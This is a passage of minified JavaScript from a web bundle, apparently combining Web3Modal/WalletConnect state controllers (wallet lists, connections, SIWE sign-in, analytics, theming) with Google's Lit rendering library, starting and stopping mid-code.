t=localStorage.getItem(vl);if(t)return JSON.parse(t)}catch{console.info("Unable to get WalletConnect deep link")}},deleteWalletConnectDeepLink(){try{localStorage.removeItem(vl)}catch{console.info("Unable to delete WalletConnect deep link")}},setWeb3ModalRecent(t){try{const e=_t.getRecentWallets();e.find(r=>r.id===t.id)||(e.unshift(t),e.length>2&&e.pop(),localStorage.setItem(Vf,JSON.stringify(e)))}catch{console.info("Unable to set Web3Modal recent")}},getRecentWallets(){try{const t=localStorage.getItem(Vf);return t?JSON.parse(t):[]}catch{console.info("Unable to get Web3Modal recent")}return[]},setConnectedWalletImageUrl(t){try{localStorage.setItem(Zf,t)}catch{console.info("Unable to set Connected Wallet Image Url")}},getConnectedWalletImageUrl(){try{return localStorage.getItem(Zf)}catch{console.info("Unable to set Connected Wallet Image Url")}},setConnectedConnector(t){try{localStorage.setItem(Gf,t)}catch{console.info("Unable to set Connected Connector")}},getConnectedConnector(){try{return localStorage.getItem(Gf)}catch{console.info("Unable to get Connected Connector")}}},Qn=At({walletImages:{},networkImages:{},connectorImages:{},tokenImages:{}}),Oi={state:Qn,subscribeNetworkImages(t){return Gn(Qn.networkImages,()=>t(Qn.networkImages))},subscribeKey(t,e){return hn(Qn,t,e)},setWalletImage(t,e){Qn.walletImages[t]=e},setNetworkImage(t,e){Qn.networkImages[t]=e},setConnectorImage(t,e){Qn.connectorImages[t]=e},setTokenImage(t,e){Qn.tokenImages[t]=e}},Or=At({connectors:[]}),We={state:Or,subscribeKey(t,e){return hn(Or,t,e)},setConnectors(t){Or.connectors=t.map(e=>ea(e))},addConnector(t){Or.connectors.push(ea(t))},getEmailConnector(){return Or.connectors.find(t=>t.type==="EMAIL")},getAnnouncedConnectorRdns(){return Or.connectors.filter(t=>t.type==="ANNOUNCED").map(t=>{var e;return(e=t.info)==null?void 0:e.rdns})},getConnectors(){return Or.connectors}},yo=At({open:!1,selectedNetworkId:void 0}),Mi={state:yo,subscribe(t){return Gn(yo,()=>t(yo))},set(t){Object.assign(yo,{...yo,...t})}},mt=At({supportsAllNetworks:!0,isDefaultCaipNetwork:!1}),Qe={state:mt,subscribeKey(t,e){return hn(mt,t,e)},_getClient(){if(!mt._client)throw new Error("NetworkController client not set");return mt._client},setClient(t){mt._client=ea(t)},setCaipNetwork(t){mt.caipNetwork=t,Mi.set({selectedNetworkId:t==null?void 0:t.id})},setDefaultCaipNetwork(t){mt.caipNetwork=t,Mi.set({selectedNetworkId:t==null?void 0:t.id}),mt.isDefaultCaipNetwork=!0},setRequestedCaipNetworks(t){mt.requestedCaipNetworks=t},async getApprovedCaipNetworksData(){const t=await this._getClient().getApprovedCaipNetworksData();mt.supportsAllNetworks=t.supportsAllNetworks,mt.approvedCaipNetworkIds=t.approvedCaipNetworkIds},async switchActiveNetwork(t){await this._getClient().switchCaipNetwork(t),mt.caipNetwork=t},resetNetwork(){mt.isDefaultCaipNetwork||(mt.caipNetwork=void 0),mt.approvedCaipNetworkIds=void 0,mt.supportsAllNetworks=!0}},Mt=At({projectId:"",sdkType:"w3m",sdkVersion:"html-wagmi-undefined"}),Ue={state:Mt,subscribeKey(t,e){return hn(Mt,t,e)},setProjectId(t){Mt.projectId=t},setIncludeWalletIds(t){Mt.includeWalletIds=t},setExcludeWalletIds(t){Mt.excludeWalletIds=t},setFeaturedWalletIds(t){Mt.featuredWalletIds=t},setTokens(t){Mt.tokens=t},setTermsConditionsUrl(t){Mt.termsConditionsUrl=t},setPrivacyPolicyUrl(t){Mt.privacyPolicyUrl=t},setCustomWallets(t){Mt.customWallets=t},setEnableAnalytics(t){Mt.enableAnalytics=t},setSdkVersion(t){Mt.sdkVersion=t},setMetadata(t){Mt.metadata=t}},U2=le.getApiUrl(),wn=new $d({baseUrl:U2}),B2="40",qf="4",vt=At({page:1,count:0,featured:[],recommended:[],wallets:[],search:[]}),Pe={state:vt,subscribeKey(t,e){return hn(vt,t,e)},_getApiHeaders(){const{projectId:t,sdkType:e,sdkVersion:n}=Ue.state;return{"x-project-id":t,"x-sdk-type":e,"x-sdk-version":n}},async _fetchWalletImage(t){const e=`${wn.baseUrl}/getWalletImage/${t}`,n=await wn.getBlob({path:e,headers:Pe._getApiHeaders()});Oi.setWalletImage(t,URL.createObjectURL(n))},async _fetchNetworkImage(t){const e=`${wn.baseUrl}/public/getAssetImage/${t}`,n=await wn.getBlob({path:e,headers:Pe._getApiHeaders()});Oi.setNetworkImage(t,URL.createObjectURL(n))},async _fetchConnectorImage(t){const e=`${wn.baseUrl}/public/getAssetImage/${t}`,n=await wn.getBlob({path:e,headers:Pe._getApiHeaders()});Oi.setConnectorImage(t,URL.createObjectURL(n))},async fetchNetworkImages(){const{requestedCaipNetworks:t}=Qe.state,e=t==null?void 0:t.map(({imageId:n})=>n).filter(Boolean);e&&await Promise.allSettled(e.map(n=>Pe._fetchNetworkImage(n)))},async fetchConnectorImages(){const{connectors:t}=We.state,e=t.map(({imageId:n})=>n).filter(Boolean);await Promise.allSettled(e.map(n=>Pe._fetchConnectorImage(n)))},async fetchFeaturedWallets(){const{featuredWalletIds:t}=Ue.state;if(t!=null&&t.length){const{data:e}=await wn.get({path:"/getWallets",headers:Pe._getApiHeaders(),params:{page:"1",entries:t!=null&&t.length?String(t.length):qf,include:t==null?void 0:t.join(",")}});e.sort((r,o)=>t.indexOf(r.id)-t.indexOf(o.id));const n=e.map(r=>r.image_id).filter(Boolean);await Promise.allSettled(n.map(r=>Pe._fetchWalletImage(r))),vt.featured=e}},async fetchRecommendedWallets(){const{includeWalletIds:t,excludeWalletIds:e,featuredWalletIds:n}=Ue.state,r=[...e??[],...n??[]].filter(Boolean),{data:o,count:i}=await wn.get({path:"/getWallets",headers:Pe._getApiHeaders(),params:{page:"1",entries:qf,include:t==null?void 0:t.join(","),exclude:r==null?void 0:r.join(",")}}),a=_t.getRecentWallets(),s=o.map(l=>l.image_id).filter(Boolean),c=a.map(l=>l.image_id).filter(Boolean);await Promise.allSettled([...s,...c].map(l=>Pe._fetchWalletImage(l))),vt.recommended=o,vt.count=i??0},async fetchWallets({page:t}){const{includeWalletIds:e,excludeWalletIds:n,featuredWalletIds:r}=Ue.state,o=[...vt.recommended.map(({id:c})=>c),...n??[],...r??[]].filter(Boolean),{data:i,count:a}=await wn.get({path:"/getWallets",headers:Pe._getApiHeaders(),params:{page:String(t),entries:B2,include:e==null?void 0:e.join(","),exclude:o.join(",")}}),s=i.map(c=>c.image_id).filter(Boolean);await Promise.allSettled([...s.map(c=>Pe._fetchWalletImage(c)),le.wait(300)]),vt.wallets=[...vt.wallets,...i],vt.count=a>vt.count?a:vt.count,vt.page=t},async searchWallet({search:t}){const{includeWalletIds:e,excludeWalletIds:n}=Ue.state;vt.search=[];const{data:r}=await wn.get({path:"/getWallets",headers:Pe._getApiHeaders(),params:{page:"1",entries:"100",search:t,include:e==null?void 0:e.join(","),exclude:n==null?void 0:n.join(",")}}),o=r.map(i=>i.image_id).filter(Boolean);await Promise.allSettled([...o.map(i=>Pe._fetchWalletImage(i)),le.wait(300)]),vt.search=r},prefetch(){vt.prefetchPromise=Promise.race([Promise.allSettled([Pe.fetchFeaturedWallets(),Pe.fetchRecommendedWallets(),Pe.fetchNetworkImages(),Pe.fetchConnectorImages()]),le.wait(3e3)])}},L2=le.getAnalyticsUrl(),j2=new $d({baseUrl:L2}),F2=["MODAL_CREATED"],bi=At({timestamp:Date.now(),data:{type:"track",event:"MODAL_CREATED"}}),we={state:bi,subscribe(t){return Gn(bi,()=>t(bi))},_getApiHeaders(){const{projectId:t,sdkType:e,sdkVersion:n}=Ue.state;return{"x-project-id":t,"x-sdk-type":e,"x-sdk-version":n}},async _sendAnalyticsEvent(t){try{if(F2.includes(t.data.event)||typeof window>"u")return;await j2.post({path:"/e",headers:we._getApiHeaders(),body:{eventId:le.getUUID(),url:window.location.href,domain:window.location.hostname,timestamp:t.timestamp,props:t.data}})}catch{}},sendEvent(t){bi.timestamp=Date.now(),bi.data=t,Ue.state.enableAnalytics&&we._sendAnalyticsEvent(bi)}},Ge=At({view:"Connect",history:["Connect"]}),ie={state:Ge,subscribeKey(t,e){return hn(Ge,t,e)},push(t,e){t!==Ge.view&&(Ge.view=t,Ge.history.push(t),Ge.data=e)},reset(t){Ge.view=t,Ge.history=[t]},replace(t,e){Ge.history.length>1&&Ge.history.at(-1)!==t&&(Ge.view=t,Ge.history[Ge.history.length-1]=t,Ge.data=e)},goBack(){if(Ge.history.length>1){Ge.history.pop();const[t]=Ge.history.slice(-1);t&&(Ge.view=t)}},goBackToIndex(t){if(Ge.history.length>1){Ge.history=Ge.history.slice(0,t+1);const[e]=Ge.history.slice(-1);e&&(Ge.view=e)}}},Pr=At({loading:!1,open:!1}),ze={state:Pr,subscribe(t){return Gn(Pr,()=>t(Pr))},subscribeKey(t,e){return hn(Pr,t,e)},async open(t){await Pe.state.prefetchPromise,t!=null&&t.view?ie.reset(t.view):ke.state.isConnected?ie.reset("Account"):ie.reset("Connect"),Pr.open=!0,Mi.set({open:!0}),we.sendEvent({type:"track",event:"MODAL_OPEN"})},close(){Pr.open=!1,Mi.set({open:!1}),we.sendEvent({type:"track",event:"MODAL_CLOSE"})},setLoading(t){Pr.loading=t}},W2=le.getBlockchainApiUrl(),Kf=new $d({baseUrl:W2}),gp={fetchIdentity({caipChainId:t,address:e}){return Kf.get({path:`/v1/identity/${e}`,params:{chainId:t,projectId:Ue.state.projectId}})},fetchTransactions({account:t,projectId:e,cursor:n}){const r=n?{cursor:n}:{};return Kf.get({path:`/v1/account/${t}/history?projectId=${e}`,params:r})}},kn=At({message:"",variant:"success",open:!1}),et={state:kn,subscribeKey(t,e){return hn(kn,t,e)},showSuccess(t){kn.message=t,kn.variant="success",kn.open=!0},showError(t){const e=le.parseError(t);kn.message=e,kn.variant="error",kn.open=!0},hide(){kn.open=!1}},at=At({transactions:[],transactionsByYear:{},loading:!1,empty:!1,next:void 0}),Xt={state:at,subscribe(t){return Gn(at,()=>t(at))},async fetchTransactions(t){const{projectId:e}=Ue.state;if(!e||!t)throw new Error("Transactions can't be fetched without a projectId and an accountAddress");at.loading=!0;try{const n=await gp.fetchTransactions({account:t,projectId:e,cursor:at.next}),r=this.filterSpamTransactions(n.data),o=[...at.transactions,...r];at.loading=!1,at.transactions=o,at.transactionsByYear=this.groupTransactionsByYear(at.transactionsByYear,r),at.empty=o.length===0,at.next=n.next?n.next:void 0}catch{we.sendEvent({type:"track",event:"ERROR_FETCH_TRANSACTIONS",properties:{address:t,projectId:e,cursor:at.next}}),et.showError("Failed to fetch transactions"),at.loading=!1,at.empty=!0}},groupTransactionsByYear(t={},e=[]){const n=t;return e.forEach(r=>{var i;const o=new Date(r.metadata.minedAt).getFullYear();n[o]||(n[o]=[]),(i=n[o])==null||i.push(r)}),n},filterSpamTransactions(t){return t.filter(e=>!e.transfers.every(r=>{var o;return((o=r.nft_info)==null?void 0:o.flags.is_spam)===!0}))},resetTransactions(){at.transactions=[],at.transactionsByYear={},at.loading=!1,at.empty=!1,at.next=void 0}},ft=At({wcError:!1,buffering:!1}),Re={state:ft,subscribeKey(t,e){return hn(ft,t,e)},_getClient(){if(!ft._client)throw new Error("ConnectionController client not set");return ft._client},setClient(t){ft._client=ea(t)},connectWalletConnect(){ft.wcPromise=this._getClient().connectWalletConnect(t=>{ft.wcUri=t,ft.wcPairingExpiry=le.getPairingExpiry()})},async connectExternal(t){var e,n;await((n=(e=this._getClient()).connectExternal)==null?void 0:n.call(e,t)),_t.setConnectedConnector(t.type)},async signMessage(t){return this._getClient().signMessage(t)},checkInstalled(t){var e,n;return(n=(e=this._getClient()).checkInstalled)==null?void 0:n.call(e,t)},resetWcConnection(){ft.wcUri=void 0,ft.wcPairingExpiry=void 0,ft.wcPromise=void 0,ft.wcLinking=void 0,ft.recentWallet=void 0,Xt.resetTransactions(),_t.deleteWalletConnectDeepLink()},setWcLinking(t){ft.wcLinking=t},setWcError(t){ft.wcError=t,ft.buffering=!1},setRecentWallet(t){ft.recentWallet=t},setBuffering(t){ft.buffering=t},async disconnect(){await this._getClient().disconnect(),this.resetWcConnection()}},Ut=At({status:"uninitialized",isSiweEnabled:!1}),nt={state:Ut,subscribeKey(t,e){return hn(Ut,t,e)},subscribe(t){return Gn(Ut,()=>t(Ut))},_getClient(){if(!Ut._client)throw new Error("SIWEController client not set");return Ut._client},async getNonce(){const e=await this._getClient().getNonce();return this.setNonce(e),e},async getSession(){const e=await this._getClient().getSession();return e&&(this.setSession(e),this.setStatus("success")),e},createMessage(t){const n=this._getClient().createMessage(t);return this.setMessage(n),n},async verifyMessage(t){return await this._getClient().verifyMessage(t)},async signIn(){return await this._getClient().signIn()},async signOut(){var e;const t=this._getClient();await t.signOut(),this.setStatus("ready"),(e=t.onSignOut)==null||e.call(t)},onSignIn(t){var n;const e=this._getClient();(n=e.onSignIn)==null||n.call(e,t)},onSignOut(){var e;const t=this._getClient();(e=t.onSignOut)==null||e.call(t)},setSIWEClient(t){Ut._client=ea(t),Ut.status="ready",Ut.isSiweEnabled=t.options.enabled},setNonce(t){Ut.nonce=t},setStatus(t){Ut.status=t},setMessage(t){Ut.message=t},setSession(t){Ut.session=t}},Dr=At({themeMode:"dark",themeVariables:{}}),It={state:Dr,subscribe(t){return Gn(Dr,()=>t(Dr))},setThemeMode(t){Dr.themeMode=t},setThemeVariables(t){Dr.themeVariables={...Dr.themeVariables,...t}},getSnapshot(){return M2(Dr)}},Xe={getWalletImage(t){if(t!=null&&t.image_url)return t==null?void 0:t.image_url;if(t!=null&&t.image_id)return Oi.state.walletImages[t.image_id]},getNetworkImage(t){if(t!=null&&t.imageUrl)return t==null?void 0:t.imageUrl;if(t!=null&&t.imageId)return Oi.state.networkImages[t.imageId]},getConnectorImage(t){if(t!=null&&t.imageUrl)return t.imageUrl;if(t!=null&&t.imageId)return Oi.state.connectorImages[t.imageId]}},wp={goBackOrCloseModal(){ie.state.history.length>1?ie.goBack():ze.close()},navigateAfterNetworkSwitch(){const{history:t}=ie.state,e=t.findIndex(n=>n==="Networks");e>=1?ie.goBackToIndex(e-1):ze.close()}};/**
 * @license
 * Copyright 2019 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */const ws=globalThis,Od=ws.ShadowRoot&&(ws.ShadyCSS===void 0||ws.ShadyCSS.nativeShadow)&&"adoptedStyleSheets"in Document.prototype&&"replace"in CSSStyleSheet.prototype,Pd=Symbol(),Yf=new WeakMap;let bp=class{constructor(e,n,r){if(this._$cssResult$=!0,r!==Pd)throw Error("CSSResult is not constructable. Use `unsafeCSS` or `css` instead.");this.cssText=e,this.t=n}get styleSheet(){let e=this.o;const n=this.t;if(Od&&e===void 0){const r=n!==void 0&&n.length===1;r&&(e=Yf.get(n)),e===void 0&&((this.o=e=new CSSStyleSheet).replaceSync(this.cssText),r&&Yf.set(n,e))}return e}toString(){return this.cssText}};const yn=t=>new bp(typeof t=="string"?t:t+"",void 0,Pd),q=(t,...e)=>{const n=t.length===1?t[0]:e.reduce((r,o,i)=>r+(a=>{if(a._$cssResult$===!0)return a.cssText;if(typeof a=="number")return a;throw Error("Value passed to 'css' function must be a 'css' function result: "+a+". Use 'unsafeCSS' to pass non-literal values, but take care to ensure page security.")})(o)+t[i+1],t[0]);return new bp(n,t,Pd)},z2=(t,e)=>{if(Od)t.adoptedStyleSheets=e.map(n=>n instanceof CSSStyleSheet?n:n.styleSheet);else for(const n of e){const r=document.createElement("style"),o=ws.litNonce;o!==void 0&&r.setAttribute("nonce",o),r.textContent=n.cssText,t.appendChild(r)}},Jf=Od?t=>t:t=>t instanceof CSSStyleSheet?(e=>{let n="";for(const r of e.cssRules)n+=r.cssText;return yn(n)})(t):t;/**
 * @license
 * Copyright 2017 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */const{is:H2,defineProperty:V2,getOwnPropertyDescriptor:Z2,getOwnPropertyNames:G2,getOwnPropertySymbols:q2,getPrototypeOf:K2}=Object,ar=globalThis,Xf=ar.trustedTypes,Y2=Xf?Xf.emptyScript:"",xl=ar.reactiveElementPolyfillSupport,Io=(t,e)=>t,Ds={toAttribute(t,e){switch(e){case Boolean:t=t?Y2:null;break;case Object:case Array:t=t==null?t:JSON.stringify(t)}return t},fromAttribute(t,e){let n=t;switch(e){case Boolean:n=t!==null;break;case Number:n=t===null?null:Number(t);break;case Object:case Array:try{n=JSON.parse(t)}catch{n=null}}return n}},Dd=(t,e)=>!H2(t,e),Qf={attribute:!0,type:String,converter:Ds,reflect:!1,hasChanged:Dd};Symbol.metadata??(Symbol.metadata=Symbol("metadata")),ar.litPropertyMetadata??(ar.litPropertyMetadata=new WeakMap);let Ei=class extends HTMLElement{static addInitializer(e){this._$Ei(),(this.l??(this.l=[])).push(e)}static get observedAttributes(){return this.finalize(),this._$Eh&&[...this._$Eh.keys()]}static createProperty(e,n=Qf){if(n.state&&(n.attribute=!1),this._$Ei(),this.elementProperties.set(e,n),!n.noAccessor){const r=Symbol(),o=this.getPropertyDescriptor(e,r,n);o!==void 0&&V2(this.prototype,e,o)}}static getPropertyDescriptor(e,n,r){const{get:o,set:i}=Z2(this.prototype,e)??{get(){return this[n]},set(a){this[n]=a}};return{get(){return o==null?void 0:o.call(this)},set(a){const s=o==null?void 0:o.call(this);i.call(this,a),this.requestUpdate(e,s,r)},configurable:!0,enumerable:!0}}static getPropertyOptions(e){return this.elementProperties.get(e)??Qf}static _$Ei(){if(this.hasOwnProperty(Io("elementProperties")))return;const e=K2(this);e.finalize(),e.l!==void 0&&(this.l=[...e.l]),this.elementProperties=new Map(e.elementProperties)}static finalize(){if(this.hasOwnProperty(Io("finalized")))return;if(this.finalized=!0,this._$Ei(),this.hasOwnProperty(Io("properties"))){const n=this.properties,r=[...G2(n),...q2(n)];for(const o of r)this.createProperty(o,n[o])}const e=this[Symbol.metadata];if(e!==null){const n=litPropertyMetadata.get(e);if(n!==void 0)for(const[r,o]of n)this.elementProperties.set(r,o)}this._$Eh=new Map;for(const[n,r]of this.elementProperties){const o=this._$Eu(n,r);o!==void 0&&this._$Eh.set(o,n)}this.elementStyles=this.finalizeStyles(this.styles)}static finalizeStyles(e){const n=[];if(Array.isArray(e)){const r=new Set(e.flat(1/0).reverse());for(const o of r)n.unshift(Jf(o))}else e!==void 0&&n.push(Jf(e));return n}static _$Eu(e,n){const r=n.attribute;return r===!1?void 0:typeof r=="string"?r:typeof e=="string"?e.toLowerCase():void 0}constructor(){super(),this._$Ep=void 0,this.isUpdatePending=!1,this.hasUpdated=!1,this._$Em=null,this._$Ev()}_$Ev(){var e;this._$Eg=new Promise(n=>this.enableUpdating=n),this._$AL=new Map,this._$ES(),this.requestUpdate(),(e=this.constructor.l)==null||e.forEach(n=>n(this))}addController(e){var n;(this._$E_??(this._$E_=new Set)).add(e),this.renderRoot!==void 0&&this.isConnected&&((n=e.hostConnected)==null||n.call(e))}removeController(e){var n;(n=this._$E_)==null||n.delete(e)}_$ES(){const e=new Map,n=this.constructor.elementProperties;for(const r of n.keys())this.hasOwnProperty(r)&&(e.set(r,this[r]),delete this[r]);e.size>0&&(this._$Ep=e)}createRenderRoot(){const e=this.shadowRoot??this.attachShadow(this.constructor.shadowRootOptions);return z2(e,this.constructor.elementStyles),e}connectedCallback(){var e;this.renderRoot??(this.renderRoot=this.createRenderRoot()),this.enableUpdating(!0),(e=this._$E_)==null||e.forEach(n=>{var r;return(r=n.hostConnected)==null?void 0:r.call(n)})}enableUpdating(e){}disconnectedCallback(){var e;(e=this._$E_)==null||e.forEach(n=>{var r;return(r=n.hostDisconnected)==null?void 0:r.call(n)})}attributeChangedCallback(e,n,r){this._$AK(e,r)}_$EO(e,n){var i;const r=this.constructor.elementProperties.get(e),o=this.constructor._$Eu(e,r);if(o!==void 0&&r.reflect===!0){const a=(((i=r.converter)==null?void 0:i.toAttribute)!==void 0?r.converter:Ds).toAttribute(n,r.type);this._$Em=e,a==null?this.removeAttribute(o):this.setAttribute(o,a),this._$Em=null}}_$AK(e,n){var i;const r=this.constructor,o=r._$Eh.get(e);if(o!==void 0&&this._$Em!==o){const a=r.getPropertyOptions(o),s=typeof a.converter=="function"?{fromAttribute:a.converter}:((i=a.converter)==null?void 0:i.fromAttribute)!==void 0?a.converter:Ds;this._$Em=o,this[o]=s.fromAttribute(n,a.type),this._$Em=null}}requestUpdate(e,n,r){if(e!==void 0){if(r??(r=this.constructor.getPropertyOptions(e)),!(r.hasChanged??Dd)(this[e],n))return;this.C(e,n,r)}this.isUpdatePending===!1&&(this._$Eg=this._$EP())}C(e,n,r){this._$AL.has(e)||this._$AL.set(e,n),r.reflect===!0&&this._$Em!==e&&(this._$ET??(this._$ET=new Set)).add(e)}async _$EP(){this.isUpdatePending=!0;try{await this._$Eg}catch(n){Promise.reject(n)}const e=this.scheduleUpdate();return e!=null&&await e,!this.isUpdatePending}scheduleUpdate(){return this.performUpdate()}performUpdate(){var r;if(!this.isUpdatePending)return;if(!this.hasUpdated){if(this.renderRoot??(this.renderRoot=this.createRenderRoot()),this._$Ep){for(const[i,a]of this._$Ep)this[i]=a;this._$Ep=void 0}const o=this.constructor.elementProperties;if(o.size>0)for(const[i,a]of o)a.wrapped!==!0||this._$AL.has(i)||this[i]===void 0||this.C(i,this[i],a)}let e=!1;const n=this._$AL;try{e=this.shouldUpdate(n),e?(this.willUpdate(n),(r=this._$E_)==null||r.forEach(o=>{var i;return(i=o.hostUpdate)==null?void 0:i.call(o)}),this.update(n)):this._$Ej()}catch(o){throw e=!1,this._$Ej(),o}e&&this._$AE(n)}willUpdate(e){}_$AE(e){var n;(n=this._$E_)==null||n.forEach(r=>{var o;return(o=r.hostUpdated)==null?void 0:o.call(r)}),this.hasUpdated||(this.hasUpdated=!0,this.firstUpdated(e)),this.updated(e)}_$Ej(){this._$AL=new Map,this.isUpdatePending=!1}get updateComplete(){return this.getUpdateComplete()}getUpdateComplete(){return this._$Eg}shouldUpdate(e){return!0}update(e){this._$ET&&(this._$ET=this._$ET.forEach(n=>this._$EO(n,this[n]))),this._$Ej()}updated(e){}firstUpdated(e){}};Ei.elementStyles=[],Ei.shadowRootOptions={mode:"open"},Ei[Io("elementProperties")]=new Map,Ei[Io("finalized")]=new Map,xl==null||xl({ReactiveElement:Ei}),(ar.reactiveElementVersions??(ar.reactiveElementVersions=[])).push("2.0.3");/**
 * @license
 * Copyright 2017 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */const $o=globalThis,Rs=$o.trustedTypes,e0=Rs?Rs.createPolicy("lit-html",{createHTML:t=>t}):void 0,yp="$lit$",tr=`lit$${(Math.random()+"").slice(9)}$`,vp="?"+tr,J2=`<${vp}>`,Zr=document,ta=()=>Zr.createComment(""),na=t=>t===null||typeof t!="object"&&typeof t!="function",xp=Array.isArray,X2=t=>xp(t)||typeof(t==null?void 0:t[Symbol.iterator])=="function",_l=`[ 	
\f\r]`,vo=/<(?:(!--|\/[^a-zA-Z])|(\/?[a-zA-Z][^>\s]*)|(\/?$))/g,t0=/-->/g,n0=/>/g,Rr=RegExp(`>|${_l}(?:([^\\s"'>=/]+)(${_l}*=${_l}*(?:[^ 	
\f\r"'\`<>=]|("|')|))|$)`,"g"),r0=/'/g,i0=/"/g,_p=/^(?:script|style|textarea|title)$/i,Ep=t=>(e,...n)=>({_$litType$:t,strings:e,values:n}),$=Ep(1),K=Ep(2),Gr=Symbol.for("lit-noChange"),rt=Symbol.for("lit-nothing"),o0=new WeakMap,Ur=Zr.createTreeWalker(Zr,129);function Cp(t,e){if(!Array.isArray(t)||!t.hasOwnProperty("raw"))throw Error("invalid template strings array");return e0!==void 0?e0.createHTML(e):e}const Q2=(t,e)=>{const n=t.length-1,r=[];let o,i=e===2?"<svg>":"",a=vo;for(let s=0;s<n;s++){const c=t[s];let l,u,p=-1,m=0;for(;m<c.length&&(a.lastIndex=m,u=a.exec(c),u!==null);)m=a.lastIndex,a===vo?u[1]==="!--"?a=t0:u[1]!==void 0?a=n0:u[2]!==void 0?(_p.test(u[2])&&(o=RegExp("</"+u[2],"g")),a=Rr):u[3]!==void 0&&(a=Rr):a===Rr?u[0]===">"?(a=o??vo,p=-1):u[1]===void 0?p=-2:(p=a.lastIndex-u[2].length,l=u[1],a=u[3]===void 0?Rr:u[3]==='"'?i0:r0):a===i0||a===r0?a=Rr:a===t0||a===n0?a=vo:(a=Rr,o=void 0);const g=a===Rr&&t[s+1].startsWith("/>")?" ":"";i+=a===vo?c+J2:p>=0?(r.push(l),c.slice(0,p)+yp+c.slice(p)+tr+g):c+tr+(p===-2?s:g)}return[Cp(t,i+(t[n]||"<?>")+(e===2?"</svg>":"")),r]};let pu=class Sp{constructor({strings:e,_$litType$:n},r){let o;this.parts=[];let i=0,a=0;const s=e.length-1,c=this.parts,[l,u]=Q2(e,n);if(this.el=Sp.createElement(l,r),Ur.currentNode=this.el.content,n===2){const p=this.el.content.firstChild;p.replaceWith(...p.childNodes)}for(;(o=Ur.nextNode())!==null&&c.length<s;){if(o.nodeType===1){if(o.hasAttributes())for(const p of o.getAttributeNames())if(p.endsWith(yp)){const m=u[a++],g=o.getAttribute(p).split(tr),w=/([.?@])?(.*)/.exec(m);c.push({type:1,index:i,name:w[2],strings:g,ctor:w[1]==="."?ty:w[1]==="?"?ny:w[1]==="@"?ry:Pc}),o.removeAttribute(p)}else p.startsWith(tr)&&(c.push({type:6,index:i}),o.removeAttribute(p));if(_p.test(o.tagName)){const p=o.textContent.split(tr),m=p.length-1;if(m>0){o.textContent=Rs?Rs.emptyScript:"";for(let g=0;g<m;g++)o.append(p[g],ta()),Ur.nextNode(),c.push({type:2,index:++i});o.append(p[m],ta())}}}else if(o.nodeType===8)if(o.data===vp)c.push({type:2,index:i});else{let p=-1;for(;(p=o.data.indexOf(tr,p+1))!==-1;)c.push({type:7,index:i}),p+=tr.length-1}i++}}static createElement(e,n){const r=Zr.createElement("template");return r.innerHTML=e,r}};function Ui(t,e,n=t,r){var a,s;if(e===Gr)return e;let o=r!==void 0?(a=n._$Co)==null?void 0:a[r]:n._$Cl;const i=na(e)?void 0:e._$litDirective$;return(o==null?void 0:o.constructor)!==i&&((s=o==null?void 0:o._$AO)==null||s.call(o,!1),i===void 0?o=void 0:(o=new i(t),o._$AT(t,n,r)),r!==void 0?(n._$Co??(n._$Co=[]))[r]=o:n._$Cl=o),o!==void 0&&(e=Ui(t,o._$AS(t,e.values),o,r)),e}let ey=class{constructor(e,n){this._$AV=[],this._$AN=void 0,this._$AD=e,this._$AM=n}get parentNode(){return this._$AM.parentNode}get _$AU(){return this._$AM._$AU}u(e){const{el:{content:n},parts:r}=this._$AD,o=((e==null?void 0:e.creationScope)??Zr).importNode(n,!0);Ur.currentNode=o;let i=Ur.nextNode(),a=0,s=0,c=r[0];for(;c!==void 0;){if(a===c.index){let l;c.type===2?l=new Fa(i,i.nextSibling,this,e):c.type===1?l=new c.ctor(i,c.name,c.strings,this,e):c.type===6&&(l=new iy(i,this,e)),this._$AV.push(l),c=r[++s]}a!==(c==null?void 0:c.index)&&(i=Ur.nextNode(),a++)}return Ur.currentNode=Zr,o}p(e){let n=0;for(const r of this._$AV)r!==void 0&&(r.strings!==void 0?(r._$AI(e,r,n),n+=r.strings.length-2):r._$AI(e[n])),n++}};class Fa{get _$AU(){var e;return((e=this._$AM)==null?void 0:e._$AU)??this._$Cv}constructor(e,n,r,o){this.type=2,this._$AH=rt,this._$AN=void 0,this._$AA=e,this._$AB=n,this._$AM=r,this.options=o,this._$Cv=(o==null?void 0:o.isConnected)??!0}get parentNode(){let e=this._$AA.parentNode;const n=this._$AM;return n!==void 0&&(e==null?void 0:e.nodeType)===11&&(e=n.parentNode),e}get startNode(){return this._$AA}get endNode(){return this._$AB}_$AI(e,n=this){e=Ui(this,e,n),na(e)?e===rt||e==null||e===""?(this._$AH!==rt&&this._$AR(),this._$AH=rt):e!==this._$AH&&e!==Gr&&this._(e):e._$litType$!==void 0?this.g(e):e.nodeType!==void 0?this.$(e):X2(e)?this.T(e):this._(e)}k(e){return this._$AA.parentNode.insertBefore(e,this._$AB)}$(e){this._$AH!==e&&(this._$AR(),this._$AH=this.k(e))}_(e){this._$AH!==rt&&na(this._$AH)?this._$AA.nextSibling.data=e:this.$(Zr.createTextNode(e)),this._$AH=e}g(e){var i;const{values:n,_$litType$:r}=e,o=typeof r=="number"?this._$AC(e):(r.el===void 0&&(r.el=pu.createElement(Cp(r.h,r.h[0]),this.options)),r);if(((i=this._$AH)==null?void 0:i._$AD)===o)this._$AH.p(n);else{const a=new ey(o,this),s=a.u(this.options);a.p(n),this.$(s),this._$AH=a}}_$AC(e){let n=o0.get(e.strings);return n===void 0&&o0.set(e.strings,n=new pu(e)),n}T(e){xp(this._$AH)||(this._$AH=[],this._$AR());const n=this._$AH;let r,o=0;for(const i of e)o===n.length?n.push(r=new Fa(this.k(ta()),this.k(ta()),this,this.options)):r=n[o],r._$AI(i),o++;o<n.length&&(this._$AR(r&&r._$AB.nextSibling,o),n.length=o)}_$AR(e=this._$AA.nextSibling,n){var r;for((r=this._$AP)==null?void 0:r.call(this,!1,!0,n);e&&e!==this._$AB;){const o=e.nextSibling;e.remove(),e=o}}setConnected(e){var n;this._$AM===void 0&&(this._$Cv=e,(n=this._$AP)==null||n.call(this,e))}}class Pc{get tagName(){return this.element.tagName}get _$AU(){return this._$AM._$AU}constructor(e,n,r,o,i){this.type=1,this._$AH=rt,this._$AN=void 0,this.element=e,this.name=n,this._$AM=o,this.options=i,r.length>2||r[0]!==""||r[1]!==""?(this._$AH=Array(r.length-1).fill(new String),this.strings=r):this._$AH=rt}_$AI(e,n=this,r,o){const i=this.strings;let a=!1;if(i===void 